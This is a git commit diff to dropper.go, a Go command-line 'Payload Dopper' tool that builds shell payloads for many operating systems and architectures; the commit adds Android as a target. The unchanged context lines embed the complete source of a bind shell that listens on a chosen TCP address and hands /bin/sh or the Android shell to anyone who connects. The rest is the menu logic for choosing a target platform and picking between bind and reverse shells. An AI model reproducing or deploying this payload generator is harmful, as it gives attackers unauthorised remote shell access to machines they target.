c5005cb833be9bae52d60f26637c17732bb7dd3a
im4x5yn74x <thesheepabides@gmail.com>
2018-11-30 09:34:01 -0800

    Update dropper.go

--- dropper.go
+++ dropper.go
@@ -38,7 +38,7 @@ func genMenu() {
 			if osOption == "linux" || osOption == "freebsd" || osOption == "nacl" || osOption == "netbsd" || osOption == "openbsd" || osOption == "plan9" || osOption == "solaris" || osOption == "dragonfly" {
 				shell = "/bin/sh"
 			}
-			if archvar == "arm" {
+			if osOption == "android" && archvar == "arm" {
 				shell = "/system/bin/sh"
 			}
 			bindshell := []byte("package main\nimport (\n\t\"log\"\n\t\"net\"\n\t\"os/exec\"\n)\nvar (\n\taddress string\n\tshell string)\nfunc bindShell(network, address, shell string) {\n\tl, err := net.Listen(network, address)\n\tif err != nil {\n\t\tlog.Fatalln(err)\n\t}\n\tdefer l.Close()\n\tfor {\n\t\tconn, _ := l.Accept()\n\t\tgo func(c net.Conn) {\n\t\t\tcmd := exec.Command(shell)\n\t\t\tcmd.Stdin = c\n\t\t\tcmd.Stdout = c\n\t\t\tcmd.Stderr = c\n\t\t\tcmd.Run()\n\t\t\tdefer c.Close()\n\t\t}(conn)\n\t}\n}\n\nfunc main() {\n\tbindShell(\"tcp\", \"" + tgtvar + "\", \"" + shell + "\")\n}")
@@ -94,7 +94,7 @@ func genMenu() {
 			if osOption == "linux" || osOption == "freebsd" || osOption == "nacl" || osOption == "netbsd" || osOption == "openbsd" || osOption == "plan9" || osOption == "solaris" || osOption == "dragonfly" {
 				shell = "/bin/sh"
 			}
-			if archvar == "arm" {
+			if osOption == "android" && archvar == "arm" {
 				shell = "/system/bin/sh"
 			}
 			bindshell := []byte("package main\nimport (\n\t\"log\"\n\t\"net\"\n\t\"os/exec\"\n)\nvar (\n\taddress string\n\tshell string)\nfunc bindShell(network, address, shell string) {\n\tl, err := net.Listen(network, address)\n\tif err != nil {\n\t\tlog.Fatalln(err)\n\t}\n\tdefer l.Close()\n\tfor {\n\t\tconn, _ := l.Accept()\n\t\tgo func(c net.Conn) {\n\t\t\tcmd := exec.Command(shell)\n\t\t\tcmd.Stdin = c\n\t\t\tcmd.Stdout = c\n\t\t\tcmd.Stderr = c\n\t\t\tcmd.Run()\n\t\t\tdefer c.Close()\n\t\t}(conn)\n\t}\n}\n\nfunc main() {\n\tbindShell(\"tcp\", \"" + tgtvar + "\", \"" + shell + "\")\n}")
@@ -227,7 +227,7 @@ func archMenu() {
 		cmdorpwsh()
 	}
 	if archvar == "386" || archvar == "amd64" || archvar == "arm" || archvar == "arm64" || archvar == "amd64p32" || archvar == "ppc64" || archvar == "ppc64le" || archvar == "mips" || archvar == "mipsle" || archvar == "mips64" || archvar == "mips64le" || archvar == "s390x" || archvar == "sparc64" {
-		if osOption == "windows" && archvar == "amd64" || osOption == "windows" && archvar == "386" || osOption == "linux" && archvar == "386" || osOption == "linux" && archvar == "amd64" || osOption == "linux" && archvar == "arm" || osOption == "linux" && archvar == "arm64" || osOption == "linux" && archvar == "ppc64" || osOption == "linux" && archvar == "ppc64le" || osOption == "linux" && archvar == "mips" || osOption == "linux" && archvar == "mipsle" || osOption == "linux" && archvar == "mips64" || osOption == "linux" && archvar == "mips64le" || osOption == "linux" && archvar == "s390x" || osOption == "freebsd" && archvar == "386" || osOption == "freebsd" && archvar == "amd64" || osOption == "freebsd" && archvar == "arm" || osOption == "nacl" && archvar == "386" || osOption == "nacl" && archvar == "amd64p32" || osOption == "nacl" && archvar == "arm" || osOption == "netbsd" && archvar == "386" || osOption == "netbsd" && archvar == "amd64" || osOption == "netbsd" && archvar == "arm" || osOption == "openbsd" && archvar == "386" || osOption == "openbsd" && archvar == "amd64" || osOption == "openbsd" && archvar == "arm" || osOption == "plan9" && archvar == "386" || osOption == "plan9" && archvar == "amd64" || osOption == "plan9" && archvar == "arm" || osOption == "solaris" && archvar == "amd64" || osOption == "dragonfly" && archvar == "amd64" || osOption == "darwin" && archvar == "386" || osOption == "darwin" && archvar == "amd64" {
+		if osOption == "windows" && archvar == "amd64" || osOption == "windows" && archvar == "386" || osOption == "linux" && archvar == "386" || osOption == "linux" && archvar == "amd64" || osOption == "linux" && archvar == "arm" || osOption == "linux" && archvar == "arm64" || osOption == "linux" && archvar == "ppc64" || osOption == "linux" && archvar == "ppc64le" || osOption == "linux" && archvar == "mips" || osOption == "linux" && archvar == "mipsle" || osOption == "linux" && archvar == "mips64" || osOption == "linux" && archvar == "mips64le" || osOption == "linux" && archvar == "s390x" || osOption == "freebsd" && archvar == "386" || osOption == "freebsd" && archvar == "amd64" || osOption == "freebsd" && archvar == "arm" || osOption == "nacl" && archvar == "386" || osOption == "nacl" && archvar == "amd64p32" || osOption == "nacl" && archvar == "arm" || osOption == "netbsd" && archvar == "386" || osOption == "netbsd" && archvar == "amd64" || osOption == "netbsd" && archvar == "arm" || osOption == "openbsd" && archvar == "386" || osOption == "openbsd" && archvar == "amd64" || osOption == "openbsd" && archvar == "arm" || osOption == "plan9" && archvar == "386" || osOption == "plan9" && archvar == "amd64" || osOption == "plan9" && archvar == "arm" || osOption == "solaris" && archvar == "amd64" || osOption == "dragonfly" && archvar == "amd64" || osOption == "darwin" && archvar == "386" || osOption == "darwin" && archvar == "amd64" || osOption == "android" && archvar == "arm" {
 			bindOrRev()
 		} else {
 			fmt.Println("Invalid OS/Architecture combination. ", osOption, "/", archvar)
@@ -275,7 +275,7 @@ func mainmenu() {
 	if osOption == "windows" {
 		cmdorpwsh()
 	}
-	if osOption == "linux" || osOption == "freebsd" || osOption == "nacl" || osOption == "netbsd" || osOption == "openbsd" || osOption == "plan9" || osOption == "solaris" || osOption == "dragonfly" || osOption == "darwin" {
+	if osOption == "linux" || osOption == "freebsd" || osOption == "nacl" || osOption == "netbsd" || osOption == "openbsd" || osOption == "plan9" || osOption == "solaris" || osOption == "dragonfly" || osOption == "darwin" || osOption == "android" {
 		getArch()
 	}
 	if osOption == "exit" {
@@ -288,7 +288,7 @@ func mainmenu() {
 }
 
 func main() {
-	oslist := [12]string{"Payload Dopper\n\n", "+...|Choose an OS|...+\n\n", "- windows\n", "- linux\n", "- freebsd\n", "- nacl\n", "- netbsd\n", "- openbsd\n", "- plan9\n", "- solaris\n", "- dragonfly\n", "- darwin\n\n"}
+	oslist := [13]string{"Payload Dopper\n\n", "+...|Choose an OS|...+\n\n", "- windows\n", "- linux\n", "- freebsd\n", "- nacl\n", "- netbsd\n", "- openbsd\n", "- plan9\n", "- solaris\n", "- dragonfly\n", "- darwin\n", "android\n\n"}
 	for j := 0; j < len(oslist); j++ {
 		fmt.Print(oslist[j])
 	}
